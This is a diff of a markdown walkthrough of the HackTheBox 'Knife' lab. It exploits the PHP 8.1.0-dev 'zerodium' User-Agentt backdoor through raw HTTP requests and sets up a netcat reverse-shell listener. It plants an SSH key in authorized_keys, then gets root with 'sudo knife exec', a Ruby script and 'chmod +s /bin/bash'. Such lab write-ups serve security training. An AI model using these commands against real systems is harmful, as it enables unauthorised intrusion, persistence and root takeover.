@@ -15,14 +15,17 @@ tags: [Lab, HackTheBox]
 			- [漏洞概述](#漏洞概述)
 			- [漏洞复现](#漏洞复现)
 	- [Gain acess to shell: Brup](#gain-acess-to-shell-brup)
-	- [Inthebox](#inthebox)
-- [User.txt:](#usertxt)
-- [SSH:](#ssh)
-- [Privilege-Escalation:](#privilege-escalation)
+		- [user.txt: Brupsuite](#usertxt-brupsuite)
+		- [user.txt: ReverseShell](#usertxt-reverseshell)
+	- [Privilege escalation](#privilege-escalation)
+		- [Root.txt: Execute ruby scripts](#roottxt-execute-ruby-scripts)
+		- [Root.txt: ssh](#roottxt-ssh)
 
 
 - ref:
-  - [](https://blog.csdn.net/qq_36584013/article/details/117315844)
+  - [Knife — Hack The Box](https://blog.csdn.net/qq_36584013/article/details/117315844)
+  - [Knife — Hack The Box - kshitij kumar](https://kshitizkr603.medium.com/knife-hack-the-box-6eac7fecd1ab)
+  - [HackTheBox-Knife靶场实战](https://zhuanlan.zhihu.com/p/374680809)
 
 ---
 
@@ -47,7 +50,7 @@ PORT   STATE SERVICE VERSION
 | ssh-hostkey:
 |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
 |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
-|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+|**  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title:  Emergent Medical Idea
@@ -137,7 +140,7 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
 - `PHP 8.1.0-dev`
 
 
-#### 漏洞复现 
+#### 漏洞复现
 
 1. 环境搭建
    - 利用vulhub搭建环境，进入`/vulhub-master/php/8.1-backdoor`中，执行`docker-compose up -d`启动环境，访问`8080`
@@ -157,8 +160,6 @@ PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被�
 
 1. 使用burp抓包，并加入字段, 发现被成功执行
 
-![Screen Shot 2021-05-29 at 2.16.20 PM](https://i.imgur.com/xz3NtvI.png)
-
 ```bash
 # send the request
 GET / HTTP/1.1
@@ -171,7 +172,6 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-
 
 # get the response
 HTTP/1.1 200 OK
@@ -186,9 +186,30 @@ Content-Type: text/html; charset=UTF-8
 <!DOCTYPE html>
 ```
 
+![Screen Shot 2021-05-29 at 2.16.20 PM](https://i.imgur.com/xz3NtvI.png)
+
+
+
 2. try commands
 
-![Screen Shot 2021-05-29 at 2.15.37 PM](https://i.imgur.com/1MHe7qp.png)
+
+```bash
+GET /css?family=Raleway:200,100,700,4004 HTTP/1.1
+Host: fonts.googleapis.com
+Connection: close
+sec-ch-ua: ";Naot A Brand";v="99","chromium";v="88"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/css, */*;q=0.1
+Sec-Fech-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: style
+Referer: http://10.10.10.242/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+```
+
+![1_c7cyx33cEdLaP17VZ1VaWg](https://i.imgur.com/mH5i1jV.png)
 
 ```bash
 # request
@@ -215,12 +236,40 @@ Content-Type: text/html; charset=UTF-8
 # uid=1000(james) gid=1000(james) groups=1000(james)
 ```
 
+![Screen Shot 2021-05-29 at 2.15.37 PM](https://i.imgur.com/1MHe7qp.png)
 
-3. push a **bash shell** under **“user-agentt”**
+
+### user.txt: Brupsuite
+
+Run command under **“user-agentt”**
+
+```bash
+# request
+GET / HTTP/1.1
+Host: 10.10.10.242
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+# User-Agentt: zerodiumsystem("cd ; cat user.txt");
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+# bf504d51c63921ad9bf94f71d9a41c**
+```
+
+![Screen Shot 2021-05-29 at 16.55.02](https://i.imgur.com/KbWDX7k.png)
+
+
+### user.txt: ReverseShell
+
+push a **bash shell** under **“user-agentt”**
 
 ```bash
 # setup the reverse shell
-ncat -l -p 1111
+ncat -lvnp 1111
+nc -lvnp 1111
 ```
 
 ```bash
@@ -237,88 +286,145 @@ Accept-Language: en-US,en;q=0.9
 Connection: close
 ```
 
+![1_4FV2zoyjjVJNAv5VSWKxgw](https://i.imgur.com/0QA3NpT.png)
 
+![pic](https://miro.medium.com/max/1600/1*op1CfSSKMQTGcz1nu6sF2g.png)
 
 
 ---
 
-## Inthebox
+## Privilege escalation
+
+make this shell a stable one
 
 ```bash
 whcih python3
-
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+check how many sudo commands can the user james run:
 
 
+```bash
+$ sudo -l
+# So poor, james can only run the command /usr/bin/knife as super user without password
+```
 
+### Root.txt: Execute ruby scripts
+
+Create a ruby script and execute it via knife from the command `knife exec [SCRIPT] (options)`
+
+1. Create a file and save it with `.rb` extension
+
+```bash
+# root.rb
+f = File.open(“/root/root.txt”, “r”)
+f.each_line do |line|
+puts line
+end
+f.close
+```
+
+2. Send it to victim machine
+
+```bash
+
+
+python -m SimpleHTTPServer 80
+```
+
+3. vicitim machine:
+
+```bash
+# get the file
+$ wget 10.0.0.20:80/root.rb
+
+# execute the script
+sudo /usr/bin/knife exec root.rb
 ```
 
 
-User.txt:
-=========
+### Root.txt: ssh
 
-Let make this shell a stable one and go for our first flag i.e. **User.txt**
+add **ssh** public key inside **james** **.ssh** folder.
 
-![pic](https://miro.medium.com/max/60/1*PkryjetVL9q2jJYMUdFuew.png?q=20)
+```bash
+$ mkdir HTBK
+$ cd HTBK/
+
+$ ssh-keygen
+	Generating public/private rsa key pair.
+	Enter file in which to save the key (/Users/luo/.ssh/id_rsa): id_rsa
+	Enter passphrase (empty for no passphrase):
+	Enter same passphrase again:
+	Your identification has been saved in id_rsa.
+	Your public key has been saved in id_rsa.pub.
+	The key fingerprint is:
+	SHA256:7aSgrJeWq1J7ifoRQsawEFgdNpiVDvY6iJe4COEcY1A luo@J.local
+	The keys randomart image is:
+	+---[RSA 3072]----+
+	|=+E==o           |
+	|*.=.o.           |
+	|o= +             |
+	|++  o    .       |
+	|*++o  . S o      |
+	|=+*o . . +       |
+	|o+.+o+  . .      |
+	|+ ooB            |
+	|.++=..           |
+	+----[SHA256]-----+
+
+$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvYqBYewmRysNFSR5ZE3mFZmOX5DjBBrNR2Y20H5NEgIyxgvjSPmINgw7alVnMqQTNUQvQULr0TZMH5Nh1hNswext4LqC5dHQizUhEJxXC6ncJLtux/hh2nzveMnraDiClU3LFhEP/TnC/SZrYor/R/G4gm6XhHsFrO2t0b1CVbo+jEgM7YUnpDknh6rAjI5L2RFIRsEHwwVC9kxGVlim0BV0NRc3sfwDKqE8AC1aK/L79RNCIeVKzRVVdi7xwI26kHVRGRa1o3gzz3SR+23oQWfjNo7hmV+KFz44xVEDi2HdGnpCaCmNirTRFPVw83/UFhDI9r2zzhUjM6+XwDRkBdlKkXU0UVGCoBjyTCvuhLHzb7qe7c+YTd0W24k95gaNUZjuFngB11v2D9fBd5uZXh1VxgrCrKx4zv27fiUpYqfEapMUF0sRgJdTUymOyB/nKablzDWlaOoqzqsyjrAZUFbB4ZpiWcAy0+sARjCjM8l5aCS6cICqs1ehdjWmCdo0= luo@J.local
+```
 
 ![pic](https://miro.medium.com/max/1370/1*PkryjetVL9q2jJYMUdFuew.png)
 
-After stabling the shell I found my first flag user.txt
-
-![pic](https://miro.medium.com/max/60/1*op1CfSSKMQTGcz1nu6sF2g.png?q=20)
-
-![pic](https://miro.medium.com/max/1600/1*op1CfSSKMQTGcz1nu6sF2g.png)
-
-Let’s get the _ssh_ shell before proceed to _privilege-escalation_ for that we need to add our _ssh_ public key inside **james** _.ssh_ folder.
-
-![pic](https://miro.medium.com/max/60/1*kIJl3Cq_L1POqnQM9KR2LA.png?q=20)
-
 ![pic](https://miro.medium.com/max/3832/1*kIJl3Cq_L1POqnQM9KR2LA.png)
 
-Now I upload **id\_rsa.pub** key inside **authorized\_keys** on the machine.
 
-![pic](https://miro.medium.com/max/60/1*Xtuq_q51vCuWhFakER38kQ.png?q=20)
+upload **id\_rsa.pub** key inside **authorized\_keys** on the machine.
+
+```bash
+# User-Agentt: zerodiumsystem("cd ; cat user.txt");
+cd .ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvYqBYewmRysNFSR5ZE3mFZmOX5DjBBrNR2Y20H5NEgIyxgvjSPmINgw7alVnMqQTNUQvQULr0TZMH5Nh1hNswext4LqC5dHQizUhEJxXC6ncJLtux/hh2nzveMnraDiClU3LFhEP/TnC/SZrYor/R/G4gm6XhHsFrO2t0b1CVbo+jEgM7YUnpDknh6rAjI5L2RFIRsEHwwVC9kxGVlim0BV0NRc3sfwDKqE8AC1aK/L79RNCIeVKzRVVdi7xwI26kHVRGRa1o3gzz3SR+23oQWfjNo7hmV+KFz44xVEDi2HdGnpCaCmNirTRFPVw83/UFhDI9r2zzhUjM6+XwDRkBdlKkXU0UVGCoBjyTCvuhLHzb7qe7c+YTd0W24k95gaNUZjuFngB11v2D9fBd5uZXh1VxgrCrKx4zv27fiUpYqfEapMUF0sRgJdTUymOyB/nKablzDWlaOoqzqsyjrAZUFbB4ZpiWcAy0+sARjCjM8l5aCS6cICqs1ehdjWmCdo0= luo@J.local" > authorized_keys
+```
 
 ![pic](https://miro.medium.com/max/3796/1*Xtuq_q51vCuWhFakER38kQ.png)
 
-SSH:
-====
-
-Now I tried to login through my own **id\_rsa key** and boom I am inside.
-
-![pic](https://miro.medium.com/max/60/1*7R4tGiXW-I7Mb5N7VyM79g.png?q=20)
+login through **id\_rsa key**
 
 ![pic](https://miro.medium.com/max/1890/1*7R4tGiXW-I7Mb5N7VyM79g.png)
 
 Privilege-Escalation:
-=====================
-
-I search many things inside machine but found nothing interesting.
-
-![pic](https://miro.medium.com/max/60/1*1PXYu5d7UBgDBCm8iMZTDQ.png?q=20)
+- check the user right
+- In the ruby file: give permission to **/bin/bash** for suid bit set so james user can easily execute the root commands and get **root.txt**
 
 ![pic](https://miro.medium.com/max/2592/1*1PXYu5d7UBgDBCm8iMZTDQ.png)
 
-After this I saw some “Ruby” files so I also programed one and execute it.
-
-![pic](https://miro.medium.com/max/60/1*GmBKl2x_ryr94rEfpf5r6Q.png?q=20)
-
 ![pic](https://miro.medium.com/max/1376/1*GmBKl2x_ryr94rEfpf5r6Q.png)
 
-Now I have my own ruby file _‘priv.rb_’ on the machine. In the ruby file I simply give permission to _/bin/bash_ for suid bit set so james user can easily execute the root commands and get my **root.txt**
 
-![pic](https://miro.medium.com/max/60/1*XxLbPPV5FqcnZ_q9cIeIUA.png?q=20)
+```bash
+# check the user right
+$ sudo -l
 
-![pic](https://miro.medium.com/max/980/1*XxLbPPV5FqcnZ_q9cIeIUA.png)
+# create ruby file
+echo "system('chmod +s /bin/bash')" > priv.rb
+sudo /usr/bin/knife exec priv.rb
+/bin/bash -p
+cd /root
+cat root.txt
+```
 
-And we are Root and found the **root flag**.
 
-![pic](https://miro.medium.com/freeze/max/60/0*Zgt3uMOlsiZO0aeu.gif?q=20)
+Thanks for reading this far. We will meet in my next article.
 
-![pic](https://miro.medium.com/max/960/0*Zgt3uMOlsiZO0aeu.gif)
+**Happy Hacking** ☺
 
-So that was it for **knife** box. I hope you liked the **write-up**.
 
-Thanks for reading this far. I will meet in my next article.
 
-H**appy Hacking** ☺
+
+
+
+.
